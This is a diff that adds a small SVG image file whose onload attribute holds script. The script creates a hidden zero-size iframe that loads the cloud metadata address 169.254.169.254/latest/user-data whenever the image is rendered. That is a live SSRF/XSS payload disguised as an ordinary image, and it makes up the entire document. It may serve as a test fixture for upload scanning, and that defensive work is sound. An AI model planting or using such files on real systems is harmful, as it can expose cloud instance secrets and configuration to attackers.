@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+  onload="var iframe=document.createElement('iframe'); iframe.src='http://169.254.169.254/latest/user-data'; iframe.style.width='0'; iframe.style.height='0'; document.body.appendChild(iframe);"
+  xmlns="http://www.w3.org/2000/svg">
+</svg>
